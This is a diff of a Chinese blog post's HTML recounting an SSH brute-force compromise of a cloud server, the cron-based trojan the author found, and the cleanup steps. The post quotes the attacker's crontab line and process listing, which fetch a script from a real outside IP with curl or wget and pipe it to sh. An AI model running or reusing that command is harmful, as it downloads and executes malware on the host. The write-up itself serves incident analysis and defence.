@@ -113,7 +113,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://blog.caogo.cn/2019/05/04/ECS遭遇安全攻击的一次经历/alert-0.png">
 <meta property="og:image" content="https://blog.caogo.cn/2019/05/04/ECS遭遇安全攻击的一次经历/alert-1.png">
-<meta property="og:updated_time" content="2019-05-28T01:17:09.601Z">
+<meta property="og:updated_time" content="2019-11-15T10:18:03.334Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECS遭遇安全攻击的一次经历">
 <meta name="twitter:description" content="突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！ 服务器的问题表现  登录ECS服务器，用top命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中/tmp/vThHH严重消耗资源，确认中招了！    服务器的root口令没有变化，但登录成功时提示有几百个failed login attempts，说明S">
@@ -439,7 +439,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-05-28 09:17:09" itemprop="dateModified" datetime="2019-05-28T09:17:09+08:00">2019-05-28</time>
+                <time title="Modified: 2019-11-15 18:18:03" itemprop="dateModified" datetime="2019-11-15T18:18:03+08:00">2019-11-15</time>
               
             
           </span>
@@ -491,11 +491,11 @@
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root      4365   736  0 18:30 ?        00:00:00 /usr/sbin/CROND -n</span><br><span class="line">root      4366  4365  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/<span class="built_in">local</span>/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br><span class="line">root      4367  4366  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/<span class="built_in">local</span>/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) |sh</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>检查cron任务</p>
+<p> 该木马由crond启动，通过<code>crontab -u root -l</code>检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/<span class="built_in">local</span>/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<p>该木马由crond启动，通过<code>crontab -u root -l</code>检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！</p>
-<pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/<span class="built_in">local</span>/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br></pre></td></tr></table></figure>
-</code></pre><h2 id="该木马的工作原理"><a href="#该木马的工作原理" class="headerlink" title="该木马的工作原理"></a>该木马的工作原理</h2><ul>
+<h2 id="该木马的工作原理"><a href="#该木马的工作原理" class="headerlink" title="该木马的工作原理"></a>该木马的工作原理</h2><ul>
 <li>通过网络爬虫等手段收集服务器域名信息</li>
 <li>以服务器默认的root用户，通过ssh暴力破解获得口令</li>
 <li>通过ssh登录，添加cron定时任务，从远端服务器下载木马程序，并存放在多个目录下</li>
@@ -507,7 +507,7 @@
 <li>手工删除上述木马程序</li>
 <li>检查系统进程、网络服务、定时任务等状态，确认问题解决</li>
 </ul>
-<h2 id="如何彻底解决SSH暴力破解的威胁？"><a href="#如何彻底解决SSH暴力破解的威胁？" class="headerlink" title="如何彻底解决SSH暴力破解的威胁？"></a>如何彻底解决SSH暴力破解的威胁？</h2><p>最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。</p>
+<h2 id="如何彻底解决SSH暴力破解的威胁"><a href="#如何彻底解决SSH暴力破解的威胁" class="headerlink" title="如何彻底解决SSH暴力破解的威胁"></a>如何彻底解决SSH暴力破解的威胁</h2><p>最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。</p>
 <p><strong><em>应该说，腾讯云提供的安全服务还是比较有效的，赞一个！</em></strong></p>
 <hr>
 <h2 id="附录1-关于lsof命令"><a href="#附录1-关于lsof命令" class="headerlink" title="附录1: 关于lsof命令"></a>附录1: 关于lsof命令</h2><p>查看被占用端口的归属进程，可用使用<code>lsof -i:&lt;port&gt;</code>命令。</p>
@@ -641,7 +641,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-count">17</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -720,7 +720,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器的问题表现"><span class="nav-number">1.</span> <span class="nav-text">服务器的问题表现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统检查的主要工作"><span class="nav-number">2.</span> <span class="nav-text">系统检查的主要工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#该木马的工作原理"><span class="nav-number">3.</span> <span class="nav-text">该木马的工作原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#处理措施"><span class="nav-number">4.</span> <span class="nav-text">处理措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何彻底解决SSH暴力破解的威胁？"><span class="nav-number">5.</span> <span class="nav-text">如何彻底解决SSH暴力破解的威胁？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附录1-关于lsof命令"><span class="nav-number">6.</span> <span class="nav-text">附录1: 关于lsof命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附录2：关于crontab命令"><span class="nav-number">7.</span> <span class="nav-text">附录2：关于crontab命令</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器的问题表现"><span class="nav-number">1.</span> <span class="nav-text">服务器的问题表现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统检查的主要工作"><span class="nav-number">2.</span> <span class="nav-text">系统检查的主要工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#该木马的工作原理"><span class="nav-number">3.</span> <span class="nav-text">该木马的工作原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#处理措施"><span class="nav-number">4.</span> <span class="nav-text">处理措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何彻底解决SSH暴力破解的威胁"><span class="nav-number">5.</span> <span class="nav-text">如何彻底解决SSH暴力破解的威胁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附录1-关于lsof命令"><span class="nav-number">6.</span> <span class="nav-text">附录1: 关于lsof命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附录2：关于crontab命令"><span class="nav-number">7.</span> <span class="nav-text">附录2：关于crontab命令</span></a></li></ol></div>
             
 
           </div>
